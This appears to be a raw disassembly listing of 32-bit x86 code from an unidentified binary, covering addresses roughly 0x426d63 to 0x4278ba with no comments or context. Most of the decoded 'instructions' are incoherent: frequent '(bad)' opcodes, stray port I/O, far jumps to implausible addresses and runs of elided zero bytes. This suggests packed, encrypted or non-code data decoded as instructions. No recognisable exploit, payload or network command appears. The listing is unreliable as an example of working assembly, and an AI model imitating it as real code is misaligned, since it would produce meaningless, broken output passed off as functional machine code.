  426d63:	lods   al,BYTE PTR ds:[esi]
  426d64:	nop
  426d65:	arpl   WORD PTR [eax],ax
  426d67:	out    dx,al
  426d68:	sbb    BYTE PTR [eax+0x3b],0x2
  426d6c:	in     al,0x88
  426d6e:	fldcw  WORD PTR [ecx-0x41fd9bd0]
  426d74:	xchg   BYTE PTR [esi+0x38],dh
  426d77:	in     eax,0xab
  426d79:	push   cs
  426d7a:	in     eax,dx
  426d7b:	outs   dx,BYTE PTR ds:[esi]
  426d7c:	or     ah,BYTE PTR [edi]
  426d7e:	retf   0xe4a
  426d81:	jnp    0x426d52
  426d83:	mov    ah,0x3b
  426d85:	sbb    DWORD PTR [esi+edx*1-0x7e],ebx
  426d89:	sub    esi,DWORD PTR [edi-0x59]
  426d8c:	mov    al,0xd9
  426d8e:	imul   ebp,DWORD PTR [edx-0x644d75c1],0x50
  426d95:	pushf  
  426d96:	dec    eax
  426d97:	cld    
  426d98:	cli    
  426d99:	pop    ecx
  426d9a:	out    dx,eax
  426d9b:	jo     0x98166587
  426da1:	stc    
  426da2:	mov    ds:0x4b53528c,eax
  426da7:	and    al,0xe8
  426da9:	out    dx,eax
  426daa:	lods   eax,DWORD PTR ds:[esi]
  426dab:	in     eax,dx
  426dac:	jmp    0x8fc84342
  426db1:	ja     0x426d3e
  426db3:	cmc    
  426db4:	mov    ebx,0xf35b64b4
  426db9:	fwait
  426dba:	add    eax,0xd08d1e45
  426dbf:	mov    DWORD PTR [edx+0x0],esi
	...
  426e32:	add    BYTE PTR [eax],al
  426e34:	(bad)  
  426e35:	jl     0x426e88
  426e37:	sar    bl,1
  426e39:	std    
  426e3a:	(bad)  
  426e3b:	jle    0x426df9
  426e3d:	(bad)  
  426e3e:	loop   0x426e84
  426e40:	jge    0x426e15
  426e42:	push   es
  426e43:	add    cl,BYTE PTR [ebp+ebx*4+0x1]
  426e47:	add    ch,dh
  426e49:	add    BYTE PTR [eax],al
  426e4b:	add    BYTE PTR [edi-0x23646215],ah
  426e51:	dec    ebp
  426e52:	cwde   
  426e53:	mov    bh,0xd3
  426e55:	sub    eax,0x2442cf22
  426e5a:	mov    ds:0x7f84d058,al
  426e5f:	mov    ebx,0xa0c3fe3d
  426e64:	shr    BYTE PTR [eax],0xe0
  426e67:	fisttp DWORD PTR [ebp-0x407e415c]
  426e6d:	in     al,0x6
  426e6f:	sbb    ch,cl
  426e71:	xor    BYTE PTR [ebp-0x25],0xfa
  426e75:	loopne 0x426eaa
  426e77:	mov    WORD PTR [esi-0x42],es
  426e7a:	dec    ecx
  426e7b:	leave  
  426e7c:	repnz xor al,0x33
  426e7f:	iret   
  426e80:	add    BYTE PTR [ecx-0x7],bh
  426e83:	iret   
  426e84:	push   esi
  426e85:	ret    0x5c06
  426e88:	fsubrp st(7),st
  426e8a:	cmp    eax,0x52cf6c0d
  426e8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e90:	dec    esp
  426e91:	jge    0x426e18
  426e93:	jl     0x426e28
  426e95:	fstp   QWORD PTR [ebp+0x51]
  426e98:	jg     0x426e82
  426e9a:	mov    BYTE PTR [eax-0x3d],dl
  426e9d:	mul    DWORD PTR [ecx-0x3b]
  426ea0:	(bad)  
  426ea1:	loope  0x426ef8
  426ea3:	sbb    al,0xa8
  426ea5:	or     esp,DWORD PTR [eax]
  426ea7:	xor    DWORD PTR [ebx+edi*4+0x2af157a9],edx
  426eae:	add    ch,BYTE PTR [edi-0x3c]
  426eb1:	in     al,0xb
  426eb3:	sub    DWORD PTR [ebp-0x64955517],0x4be67ebb
  426ebd:	clc    
  426ebe:	xlat   BYTE PTR ds:[ebx]
  426ebf:	push   ebp
  426ec0:	mov    eax,ds:0x34827e44
  426ec5:	cld    
  426ec6:	push   ss
  426ec7:	xchg   esp,eax
  426ec8:	(bad)  
  426eca:	enter  0x3a71,0x64
  426ece:	sub    esi,ecx
  426ed0:	xchg   esi,ebx
  426ed2:	jb     0x426e93
  426ed4:	push   esi
  426ed5:	leave  
  426ed6:	cwde   
  426ed7:	sub    ecx,DWORD PTR [edi-0x7891039]
  426edd:	aas    
  426ede:	pop    esp
  426edf:	mov    ss,WORD PTR [eax-0x388cb94e]
  426ee5:	push   esp
  426ee6:	aam    0xac
  426ee8:	out    0x53,eax
  426eea:	mov    WORD PTR [ecx],?
  426eec:	jmp    0x6f39bfb3
  426ef1:	gs push esi
  426ef3:	xor    DWORD PTR [ebp-0x6f815a4f],edx
  426ef9:	not    DWORD PTR [esi]
  426efb:	mov    dh,0x55
  426efd:	ja     0x426ed7
  426eff:	out    dx,eax
  426f00:	xor    ch,BYTE PTR [edi-0x33bbf0c2]
  426f06:	xchg   ebp,eax
  426f07:	(bad)  
  426f08:	mov    esp,0xe2967691
  426f0d:	or     esi,DWORD PTR [ebx-0x16dc1e91]
  426f13:	jne    0x426ee4
  426f15:	pop    ss
  426f16:	mov    cl,BYTE PTR [edi+0xa]
  426f19:	into   
  426f1a:	ret    
  426f1b:	add    ebp,DWORD PTR [eax]
  426f1d:	sub    eax,0x1b58486e
  426f22:	and    dh,BYTE PTR [ebx]
  426f24:	clc    
  426f25:	outs   dx,BYTE PTR ds:[esi]
  426f26:	or     eax,0xb510c3e7
  426f2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f2c:	sbb    al,0x65
  426f2e:	inc    edx
  426f2f:	mov    dl,0xc0
  426f31:	or     edi,DWORD PTR [esi]
  426f33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f34:	add    DWORD PTR [edi],ebp
  426f36:	pop    ecx
  426f37:	xchg   edx,eax
  426f38:	into   
  426f39:	outs   dx,BYTE PTR ds:[esi]
  426f3a:	cs pop ds
  426f3c:	xchg   esp,eax
  426f3d:	std    
  426f3e:	xor    BYTE PTR [edx],cl
  426f40:	add    DWORD PTR [eax],eax
	...
  426fb2:	add    BYTE PTR [eax],al
  426fb4:	cmp    DWORD PTR [eax-0x6854f9f5],ebx
  426fba:	cmp    eax,0xcc7989bf
  426fbf:	pop    ebx
  426fc0:	adc    cl,ch
  426fc2:	dec    ebx
  426fc3:	add    DWORD PTR [ecx-0x62],eax
  426fc6:	add    DWORD PTR [eax],eax
  426fc8:	cmc    
  426fc9:	add    BYTE PTR [eax],al
  426fcb:	add    BYTE PTR [esi-0x12810396],dl
  426fd1:	stos   BYTE PTR es:[edi],al
  426fd2:	int    0x5a
  426fd4:	(bad)  
  426fd6:	fisubr DWORD PTR [ebp-0x74]
  426fd9:	mov    eax,0xa1761f95
  426fde:	push   0xffffffa9
  426fe0:	jo     0x426ffc
  426fe2:	cli    
  426fe3:	test   eax,0x81e42918
  426fe8:	pop    esp
  426fe9:	dec    edi
  426fea:	mov    ch,0x67
  426fec:	imul   esp,DWORD PTR [ebp+eiz*8+0x35],0xffffff88
  426ff1:	mov    ds:0x85385e78,al
  426ff6:	pushf  
  426ff7:	lea    ebx,[edi+0x7]
  426ffa:	mov    ecx,0xcff3c5b5
  426fff:	push   es
  427000:	jmp    0x42b3988f
  427005:	in     eax,0x33
  427007:	rcl    BYTE PTR [ecx+edx*8-0x46a79b1d],0xec
  42700f:	dec    ebp
  427010:	add    esi,edx
  427012:	sub    bh,BYTE PTR [edi]
  427014:	pop    es
  427015:	sbb    ebp,DWORD PTR [eax-0x698805a2]
  42701b:	and    al,0x5f
  42701d:	push   cs
  42701e:	push   0x32
  427020:	call   0x77d188f0
  427025:	sub    bh,BYTE PTR [edx+0x3e91a202]
  42702b:	push   ecx
  42702c:	test   eax,0x66734140
  427031:	cmp    eax,0x7a6b539d
  427036:	mov    esi,0xd0fd39f9
  42703b:	jb     0x42700e
  42703d:	test   al,0xb5
  42703f:	inc    ecx
  427040:	pop    esp
  427041:	gs pop esi
  427043:	repnz nop
  427045:	inc    eax
  427046:	fs (bad) 
  427049:	mov    ch,0xb8
  42704b:	inc    ebx
  42704c:	scas   al,BYTE PTR es:[edi]
  42704d:	mov    ebx,0xf6dfa05b
  427052:	clc    
  427053:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427054:	sbb    BYTE PTR [esi+esi*8+0x742b6319],dh
  42705b:	mov    ebx,0xc6b3fe48
  427060:	popa   
  427061:	das    
  427062:	jo     0x427068
  427064:	xchg   esp,eax
  427065:	xor    ch,ch
  427067:	in     al,0x49
  427069:	out    0xe4,al
  42706b:	pop    edx
  42706c:	ficomp DWORD PTR [esi]
  42706e:	mov    ebx,0x841eb447
  427073:	shr    BYTE PTR [edx-0x58e16663],cl
  427079:	cwde   
  42707a:	inc    eax
  42707b:	mov    ch,0xa9
  42707d:	je     0x4270bc
  42707f:	ret    
  427080:	ins    BYTE PTR es:[edi],dx
  427081:	std    
  427082:	ret    
  427083:	mov    dl,BYTE PTR [eax]
  427085:	pusha  
  427086:	mov    ch,0xfc
  427088:	bound  ecx,QWORD PTR [edx+0x5ae3830e]
  42708e:	jmp    0x9e179d1c
  427093:	xor    DWORD PTR [edx+0x2c3930af],esp
  427099:	mov    dh,0xdd
  42709b:	test   esi,ebp
  42709d:	cmp    bl,cl
  42709f:	les    eax,FWORD PTR [ebx+0x740a9b09]
  4270a5:	aaa    
  4270a6:	out    0xc5,al
  4270a8:	test   ecx,esp
  4270aa:	enter  0x1de5,0xaa
  4270ae:	into   
  4270af:	mov    ds:0xd201b781,eax
  4270b4:	pop    ebx
  4270b5:	inc    ebx
  4270b6:	retf   0xc39f
  4270b9:	loop   0x427051
  4270bb:	sbb    al,0x73
  4270bd:	jl     0x427090
  4270bf:	cmp    bh,BYTE PTR [ebp+0x0]
	...
  427132:	add    BYTE PTR [eax],al
  427134:	fwait
  427135:	and    DWORD PTR [edi],ecx
  427137:	popa   
  427138:	mov    edi,0xcefbff6f
  42713d:	aad    0x24
  42713f:	aam    0xc5
  427141:	mov    bh,0x8b
  427143:	daa    
  427144:	ss lahf 
  427146:	add    DWORD PTR [eax],eax
  427148:	cmc    
  427149:	add    BYTE PTR [eax],al
  42714b:	add    BYTE PTR [edi+0x7],dh
  42714e:	inc    eax
  42714f:	pop    esp
  427150:	pop    es
  427151:	in     eax,dx
  427152:	adc    DWORD PTR [ecx],esp
  427154:	mov    ds,ecx
  427156:	dec    edx
  427157:	lods   eax,DWORD PTR ds:[esi]
  427158:	sbb    DWORD PTR [eax+0x2eae04e1],ebx
  42715e:	pop    edi
  42715f:	push   cs
  427160:	sbb    BYTE PTR [edi+0x79],al
  427163:	jae    0x427197
  427165:	jl     0x427133
  427167:	data16 sbb BYTE PTR [edx+0x32],bh
  42716b:	cld    
  42716c:	loopne 0x42719a
  42716e:	mov    esp,0x6c17b50c
  427173:	dec    edx
  427174:	pop    ebx
  427175:	push   edx
  427176:	loope  0x4271f2
  427178:	add    al,0xa7
  42717a:	popf   
  42717b:	in     al,0x61
  42717d:	ja     0x4271fb
  42717f:	mov    ah,0x2d
  427181:	push   ebx
  427182:	les    edx,FWORD PTR [ebp+0x5f]
  427185:	jb     0x42717a
  427187:	pop    ss
  427188:	test   BYTE PTR [edi+edi*2+0x1d],ch
  42718c:	push   esp
  42718d:	cli    
  42718e:	inc    ebx
  42718f:	or     esp,DWORD PTR [edi+0x35e669dc]
  427195:	popf   
  427196:	add    edx,edx
  427198:	test   DWORD PTR [ecx+0x170dc064],ebx
  42719e:	mov    eax,ds:0x40f62464
  4271a3:	dec    edi
  4271a4:	jp     0x427132
  4271a6:	mov    al,ds:0x82d8d1c6
  4271ab:	ins    BYTE PTR es:[edi],dx
  4271ac:	or     BYTE PTR [eax-0x5bbba188],dh
  4271b2:	sub    al,0x3d
  4271b4:	int3   
  4271b5:	test   eax,0xda5f83cc
  4271ba:	add    BYTE PTR [ebp-0x2c],0xf9
  4271be:	ret    
  4271bf:	sti    
  4271c0:	mov    al,0xfd
  4271c2:	pop    esi
  4271c3:	push   ds
  4271c4:	mov    esi,0x8166bf25
  4271c9:	push   DWORD PTR [esi-0x40]
  4271cc:	dec    ebp
  4271cd:	arpl   cx,sp
  4271cf:	add    DWORD PTR [ecx+0x7b],0xffffffe6
  4271d3:	popf   
  4271d4:	and    DWORD PTR [ecx],ecx
  4271d6:	cmp    eax,0x464e99db
  4271db:	push   ecx
  4271dc:	aad    0x6c
  4271de:	adc    dh,BYTE PTR [ebx+0x43]
  4271e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4271e2:	std    
  4271e3:	pop    edi
  4271e4:	cwde   
  4271e5:	mov    al,0x2d
  4271e7:	inc    ebp
  4271e8:	jmp    0x5e1c:0xd1c50c2d
  4271ef:	jnp    0x427234
  4271f1:	pop    ecx
  4271f2:	pushf  
  4271f3:	iret   
  4271f4:	out    0x82,eax
  4271f6:	pcmpgtw mm6,QWORD PTR [edi-0x5e0895d0]
  4271fd:	out    dx,al
  4271fe:	sbb    esi,DWORD PTR [edi+0x2d35cefe]
  427204:	iret   
  427205:	mov    ebx,gs
  427207:	aaa    
  427208:	add    eax,0x7420257
  42720d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42720e:	pop    ebp
  42720f:	dec    ebp
  427210:	add    ecx,DWORD PTR [ebx+0x5c96f89]
  427216:	test   al,0xd5
  427218:	pop    esp
  427219:	repz xchg edx,eax
  42721b:	pushf  
  42721c:	mov    WORD PTR [edx+0x90a71cf],cs
  427222:	test   al,0x32
  427224:	loope  0x42722c
  427226:	adc    BYTE PTR ds:0x52385e89,bl
  42722c:	adc    dl,BYTE PTR [edx+0x7a822c44]
  427232:	xor    eax,0xcf391d45
  427237:	jnp    0x4271df
  427239:	ins    DWORD PTR es:[edi],dx
  42723a:	pop    ebp
  42723b:	leave  
  42723c:	push   ecx
  42723d:	mov    esi,0x515a96
	...
  4272b2:	add    BYTE PTR [eax],al
  4272b4:	push   esp
  4272b5:	and    eax,0xeefd4e8d
  4272ba:	xlat   BYTE PTR ds:[ebx]
  4272bb:	aas    
  4272bc:	jle    0x427280
  4272be:	ds jmp 0x7be5a882
  4272c4:	sub    esp,DWORD PTR [eax+0xf50001]
  4272ca:	add    BYTE PTR [eax],al
  4272cc:	and    eax,0xdfe44d13
  4272d1:	outs   dx,BYTE PTR ds:[esi]
  4272d2:	jne    0x427300
  4272d4:	and    al,0x34
  4272d6:	inc    ecx
  4272d7:	cmp    eax,0x881220c0
  4272dc:	and    al,cl
  4272de:	xor    al,BYTE PTR [edi-0xc790be0]
  4272e4:	mov    eax,0xc53b8a5a
  4272e9:	in     al,dx
  4272ea:	ins    DWORD PTR es:[edi],dx
  4272eb:	jb     0x427348
  4272ed:	pop    es
  4272ee:	xchg   ebx,eax
  4272ef:	cli    
  4272f0:	retf   
  4272f1:	test   eax,0xea9b67d5
  4272f6:	out    dx,eax
  4272f7:	nop
  4272f8:	push   ebx
  4272f9:	test   BYTE PTR [esi-0x7b7d2fd],cl
  4272ff:	pop    ecx
  427300:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427301:	push   edx
  427302:	dec    edi
  427303:	or     al,0xff
  427305:	mov    esi,0x49b5896d
  42730a:	mov    cl,0x23
  42730c:	pop    esi
  42730d:	cwde   
  42730e:	fimul  WORD PTR [edi+eiz*4+0x7c]
  427312:	jmp    0xe1eb:0x5663c998
  427319:	pop    esi
  42731a:	inc    ebx
  42731b:	cs mov al,0x4e
  42731e:	aas    
  42731f:	ror    DWORD PTR [esi],0xbe
  427322:	add    edi,esp
  427324:	cli    
  427325:	pop    ebx
  427326:	cmc    
  427327:	(bad)  
  427328:	cmc    
  427329:	fldenv [ebx]
  42732b:	jno    0x4272b6
  42732d:	ja     0x427380
  42732f:	ret    
  427330:	add    BYTE PTR ds:0x901d76b3,al
  427336:	clc    
  427337:	sub    cl,bh
  427339:	sbb    DWORD PTR [esi],ebp
  42733b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42733c:	jns    0x42737f
  42733e:	das    
  42733f:	xchg   esi,eax
  427340:	rcl    BYTE PTR [eax+0x41],1
  427343:	outs   dx,DWORD PTR ds:[esi]
  427344:	mov    bl,0x16
  427346:	and    bh,ah
  427348:	scas   eax,DWORD PTR es:[edi]
  427349:	add    eax,0xdf395a28
  42734e:	add    al,0xdd
  427350:	scas   al,BYTE PTR es:[edi]
  427351:	xchg   esp,eax
  427352:	pop    esi
  427353:	push   cs
  427354:	gs mov ah,0x3e
  427357:	int    0x79
  427359:	add    eax,0x20ab9e27
  42735e:	cmp    bh,BYTE PTR [edx+0x51]
  427361:	jne    0x427376
  427363:	or     BYTE PTR [eax+ebx*1-0x19],al
  427367:	mov    dl,0xed
  427369:	jmp    0x71c5:0xdf480489
  427370:	jbe    0x4273c1
  427372:	and    eax,0x84386077
  427377:	cmp    al,0xc
  427379:	daa    
  42737a:	int    0x6e
  42737c:	jo     0x42736f
  42737e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42737f:	mov    edi,0x5d0a3d0d
  427384:	and    esp,DWORD PTR [ebp+0x55e0b2a0]
  42738a:	cmp    DWORD PTR [ebp+0x72],ecx
  42738d:	inc    si
  42738f:	scas   al,BYTE PTR es:[edi]
  427390:	je     0x4273e0
  427392:	cmp    DWORD PTR [edi+0x364748c9],0xffffffa6
  427399:	sub    al,0x7a
  42739b:	seta   BYTE PTR [edx]
  42739e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42739f:	or     edx,DWORD PTR ds:0xa2ed84d6
  4273a5:	sub    al,0x72
  4273a7:	(bad)  
  4273a8:	jmp    0x6650d985
  4273ad:	js     0x427349
  4273af:	ss xchg edx,eax
  4273b1:	pop    ss
  4273b2:	lods   al,BYTE PTR ds:[esi]
  4273b3:	fistp  WORD PTR [ebx-0x23]
  4273b6:	push   edi
  4273b7:	xor    eax,0xf08fd48f
  4273bc:	mov    esp,0x98cd61eb
	...
  427431:	add    BYTE PTR [eax],al
  427433:	add    BYTE PTR [ecx+0x6f],ch
  427436:	mov    BYTE PTR [eax],cl
  427438:	mov    gs,edi
  42743a:	jmp    0xe38703ae
  42743f:	jmp    0xa120:0x2933ac0
  427446:	add    DWORD PTR [eax],eax
  427448:	cmc    
  427449:	add    BYTE PTR [eax],al
  42744b:	add    BYTE PTR [ecx],al
  42744d:	shr    al,cl
  42744f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427450:	stos   DWORD PTR es:[edi],eax
  427451:	pop    esp
  427452:	(bad)  
  427453:	jg     0x4274a1
  427455:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427456:	mov    al,0x87
  427458:	int    0x3e
  42745a:	sbb    BYTE PTR [edx+0x64],al
  42745d:	push   eax
  42745e:	cwde   
  42745f:	fidivr WORD PTR [edx]
  427461:	loop   0x42745a
  427463:	mov    ecx,DWORD PTR [ecx+0x14bda67a]
  427469:	dec    esi
  42746a:	shl    DWORD PTR [bx+si],0x91
  42746e:	iret   
  42746f:	retf   0x5181
  427472:	xchg   esi,eax
  427473:	in     eax,0x5a
  427475:	push   cs
  427476:	jne    0x4274b0
  427478:	sub    ah,BYTE PTR ds:[ebp-0x7cf827e]
  42747f:	inc    ebp
  427480:	bound  esp,QWORD PTR [ebp-0x10]
  427483:	mov    cl,bh
  427485:	aas    
  427486:	xchg   ebp,eax
  427487:	mov    eax,0x20f062fc
  42748c:	or     ch,BYTE PTR [ebp+ecx*2-0x25]
  427490:	pop    eax
  427491:	cld    
  427492:	ds mov ecx,0x4189d8d4
  427498:	pop    eax
  427499:	test   BYTE PTR [ebx-0x63],bl
  42749c:	idiv   eax
  42749e:	call   0x1224c321
  4274a3:	mov    eax,ds:0x4c17678
  4274a8:	or     eax,0x9f57c663
  4274ad:	add    BYTE PTR [ebp+0x66cf1d3c],al
  4274b3:	(bad)  
  4274b4:	and    BYTE PTR [esi-0x6050268a],ah
  4274ba:	shl    BYTE PTR [edi+0x1ce87dd8],0xd1
  4274c1:	or     eax,0x86710e1
  4274c6:	outs   dx,BYTE PTR ds:[esi]
  4274c7:	add    al,0xdd
  4274c9:	xor    BYTE PTR [ebp-0x54473e02],ah
  4274cf:	cmp    edx,edx
  4274d1:	push   0xf26e665b
  4274d6:	jle    0x427505
  4274d8:	xchg   ebp,eax
  4274d9:	xor    cl,BYTE PTR [esi]
  4274db:	outs   dx,BYTE PTR ds:[esi]
  4274dc:	cmp    BYTE PTR [ecx+0x6222f111],bh
  4274e2:	ds push esi
  4274e4:	sub    ah,BYTE PTR [ebx+esi*8-0x6b96972b]
  4274eb:	sub    eax,0x39033e7b
  4274f0:	(bad)  
  4274f1:	loope  0x427484
  4274f3:	je     0x4274e3
  4274f5:	add    ecx,DWORD PTR [ebp+0x37cce91]
  4274fb:	ret    
  4274fc:	ficom  WORD PTR [edi+0xdf1c61c]
  427502:	fild   WORD PTR [ebx+edx*2+0x805c161]
  427509:	inc    eax
  42750a:	inc    ebx
  42750b:	outs   dx,BYTE PTR ds:[esi]
  42750c:	pop    ecx
  42750d:	imul   DWORD PTR [ecx]
  42750f:	test   DWORD PTR [ecx],eax
  427511:	aad    0x85
  427513:	or     edx,0x73d1447c
  427519:	(bad)  
  42751b:	mov    edi,0x626e0395
  427520:	test   eax,0x70a80f7f
  427525:	loop   0x42759e
  427527:	and    cl,bl
  427529:	in     eax,dx
  42752a:	adc    DWORD PTR [edx+0x6b],esi
  42752d:	push   ebp
  42752e:	dec    ebx
  42752f:	adc    cl,BYTE PTR [esi+0x38]
  427532:	sbb    esi,DWORD PTR [ebp+0x2b6cbbd8]
  427538:	js     0x427540
  42753a:	neg    BYTE PTR [eax-0x65]
  42753d:	out    dx,eax
  42753e:	mov    bl,0x57
  427540:	in     eax,0x0
	...
  4275b2:	add    BYTE PTR [eax],al
  4275b4:	adc    cl,bl
  4275b6:	sbb    DWORD PTR [edx],0xcb9b5ad9
  4275bc:	mov    ds:0x2f9a8b87,al
  4275c1:	repz inc eax
  4275c3:	xor    eax,0x1a215
  4275c8:	cmc    
  4275c9:	add    BYTE PTR [eax],al
  4275cb:	add    BYTE PTR [ecx-0x5c],bh
  4275ce:	mov    ah,bl
  4275d0:	xchg   esp,eax
  4275d1:	push   cs
  4275d2:	es daa 
  4275d4:	xor    ecx,DWORD PTR [ecx-0x38fd08b5]
  4275da:	mov    eax,ds:0x85353e10
  4275df:	dec    esi
  4275e0:	leave  
  4275e1:	(bad)  
  4275e2:	das    
  4275e3:	inc    ecx
  4275e4:	jmp    0x9aa14d5d
  4275e9:	and    dh,ah
  4275eb:	int3   
  4275ec:	mov    dl,0x41
  4275ee:	aas    
  4275ef:	ret    
  4275f0:	jns    0x42766f
  4275f2:	cmp    DWORD PTR [ecx],edx
  4275f4:	adc    DWORD PTR [edx],0x187275d1
  4275fa:	out    0x1c,al
  4275fc:	cld    
  4275fd:	or     DWORD PTR [ebx-0x6c],edx
  427600:	les    esp,FWORD PTR [esi]
  427602:	ins    BYTE PTR es:[edi],dx
  427603:	adc    eax,0xba28b0b9
  427608:	aaa    
  427609:	arpl   sp,dx
  42760b:	mov    ds:0xb44481a7,al
  427610:	jnp    0x427617
  427612:	and    ecx,DWORD PTR [edi]
  427614:	jmp    0x427667
  427616:	and    esi,DWORD PTR [ecx+0x5d]
  427619:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42761a:	ins    DWORD PTR es:[edi],dx
  42761b:	fs dec ebx
  42761d:	(bad)
  427620:	enter  0x1071,0x39
  427624:	pop    ebx
  427625:	sbb    esp,DWORD PTR [ecx-0x3c7c6003]
  42762b:	sub    BYTE PTR [esi-0x7d],dl
  42762e:	das    
  42762f:	test   eax,0x8abbd1e5
  427634:	adc    al,0xe
  427636:	pushf  
  427637:	jno    0x4275cc
  427639:	jne    0x4275d0
  42763b:	or     DWORD PTR [edx+ebx*2+0xe67bfab],0xfffffffd
  427643:	adc    eax,0x381cfd3
  427648:	loop   0x4276b3
  42764a:	push   0x6b
  42764c:	xor    BYTE PTR [edx-0x16c8eb14],bh
  427652:	mov    ch,0x18
  427654:	outs   dx,BYTE PTR ds:[esi]
  427655:	cmp    edi,DWORD PTR [esi]
  427657:	inc    ebp
  427658:	std    
  427659:	(bad)  
  42765a:	xor    edx,eax
  42765c:	push   edx
  42765d:	and    DWORD PTR [edx],ecx
  42765f:	rcr    DWORD PTR [ebp-0x57c3214c],0xb5
  427666:	xchg   al,ch
  427668:	cmp    eax,0x1d93690b
  42766d:	sbb    bl,BYTE PTR [ebx]
  42766f:	push   ss
  427670:	lds    esi,FWORD PTR [edx-0x74]
  427673:	push   ebp
  427674:	outs   dx,BYTE PTR ds:[esi]
  427675:	inc    esi
  427676:	out    dx,eax
  427677:	mov    DWORD PTR ds:0xb615b78a,esi
  42767d:	popf   
  42767e:	fisubr WORD PTR [esp+eax*2-0x40b21ee9]
  427685:	sbb    al,0xd1
  427687:	mov    ah,0x52
  427689:	mov    esi,0xacb095d3
  42768e:	jmp    0xbb56:0x83494fc1
  427695:	fsubr  QWORD PTR [esp+ecx*2-0x4b]
  427699:	(bad)  
  42769a:	pop    esi
  42769b:	ins    DWORD PTR es:[edi],dx
  42769c:	popf   
  42769d:	into   
  42769e:	pop    ss
  42769f:	sub    al,BYTE PTR [eax+0x16]
  4276a2:	iret   
  4276a3:	(bad)  
  4276a4:	repnz les esi,FWORD PTR [ecx]
  4276a7:	ins    DWORD PTR es:[edi],dx
  4276a8:	sub    eax,0xd8525717
  4276ad:	mov    bh,BYTE PTR [ebx-0xec23226]
  4276b3:	mov    esp,edx
  4276b5:	sbb    ebx,DWORD PTR [ebp-0x48]
  4276b8:	dec    ebp
  4276b9:	or     dh,BYTE PTR [esp+ebp*1+0x31]
  4276bd:	dec    ebp
  4276be:	xchg   ebx,eax
  4276bf:	add    bl,0x0
	...
  427732:	add    BYTE PTR [eax],al
  427734:	mov    eax,0xff2ace8d
  427739:	imul   edi,esp,0xffffff9f
  42773c:	and    al,0x37
  42773e:	or     al,0x49
  427740:	aas    
  427741:	(bad)  
  427743:	push   ecx
  427744:	or     ah,BYTE PTR [ebx+0xf50001]
  42774a:	add    BYTE PTR [eax],al
  42774c:	ret    0x9a69
  42774f:	push   edx
  427750:	fcmovne st,st(2)
  427752:	add    eax,0xe9bb1b39
  427757:	xchg   esp,eax
  427758:	lock cmp eax,0x2ce62dcd
  42775e:	and    BYTE PTR ds:0x1300f344,dh
  427764:	ss jbe 0x4277cc
  427767:	jns    0x4277cd
  427769:	fimul  WORD PTR [edi-0x66]
  42776c:	(bad)  
  42776e:	mov    esi,DWORD PTR [ebp+0x54]
  427771:	dec    esi
  427772:	shr    DWORD PTR [ebx-0x7f],0x6c
  427776:	xor    eax,0x903f1925
  42777b:	sub    ah,dl
  42777d:	xchg   esi,eax
  42777e:	test   al,0x86
  427780:	inc    ecx
  427781:	ss std 
  427783:	inc    ecx
  427784:	and    al,0x42
  427786:	gs jne 0x4277f9
  427789:	adc    BYTE PTR [edi+0x3d37fd4f],dl
  42778f:	add    BYTE PTR [ebp+0x40],0xc6
  427793:	ror    DWORD PTR [ebx+esi*8-0x323ccf99],0x16
  42779b:	push   esp
  42779c:	inc    eax
  42779d:	outs   dx,DWORD PTR ds:[esi]
  42779e:	or     BYTE PTR [ecx+0x55415af4],al
  4277a4:	mov    gs,WORD PTR [eax-0x44eef304]
  4277aa:	out    dx,al
  4277ab:	fimul  WORD PTR [edx+ecx*1]
  4277ae:	not    BYTE PTR [ebx-0x7600ec31]
  4277b4:	into   
  4277b5:	mov    edi,0xdd0e874
  4277ba:	jecxz  0x427818
  4277bc:	retf   
  4277bd:	mov    esi,0xf0268e00
  4277c2:	loope  0x427830
  4277c4:	shl    DWORD PTR [ebx],0x4d
  4277c7:	fcmovb st,st(5)
  4277c9:	sub    al,BYTE PTR [ebx-0x117a6aef]
  4277cf:	and    ebx,DWORD PTR [ebx+0x3c]
  4277d2:	adc    eax,0x9d91af58
  4277d7:	mov    WORD PTR [ebx+0x54],?
  4277da:	xchg   ebx,eax
  4277db:	jmp    0x42776c
  4277dd:	rcr    BYTE PTR [ecx],1
  4277df:	dec    edx
  4277e0:	je     0x4277e1
  4277e2:	jl     0x4277f2
  4277e4:	mov    ecx,0xca1d0a8e
  4277e9:	sbb    BYTE PTR [ecx+0x6b4cc3d4],bl
  4277ef:	push   ebx
  4277f0:	xlat   BYTE PTR ds:[ebx]
  4277f1:	sub    al,BYTE PTR [edi+eax*8]
  4277f4:	jo     0x42778c
  4277f6:	emms   
  4277f8:	or     ch,BYTE PTR ds:0xd6a95080
  4277fe:	add    BYTE PTR fs:[esi],dl
  427801:	aam    0xb4
  427803:	add    eax,0x9c39cb7e
  427808:	push   esp
  427809:	dec    esp
  42780a:	(bad)
  42780d:	jns    0x427884
  42780f:	add    BYTE PTR [ecx],cl
  427811:	jle    0x4277f3
  427813:	je     0x4277a3
  427815:	push   ss
  427816:	ror    BYTE PTR [esi-0x53],cl
  427819:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42781a:	mov    WORD PTR [ebx],?
  42781c:	fsub   st,st(6)
  42781e:	xchg   edx,eax
  42781f:	push   ebx
  427820:	cld    
  427821:	adc    dl,0x73
  427824:	dec    esi
  427825:	push   cs
  427826:	outs   dx,DWORD PTR ds:[esi]
  427827:	inc    esi
  427828:	inc    ebp
  427829:	pop    esp
  42782a:	rcr    BYTE PTR [eax-0x69e37592],cl
  427830:	jle    0x42783f
  427832:	ja     0x427820
  427834:	and    ebp,0x2b
  427837:	sub    DWORD PTR ds:0xfd3ff059,edi
  42783d:	in     al,dx
  42783e:	inc    ecx
  42783f:	dec    edx
  427840:	mov    ds:0x0,al
	...
  4278b1:	add    BYTE PTR [eax],al
  4278b3:	add    BYTE PTR [esi+ecx*2+0x7fff7d7d],cl
  4278ba:	mov    edi,?
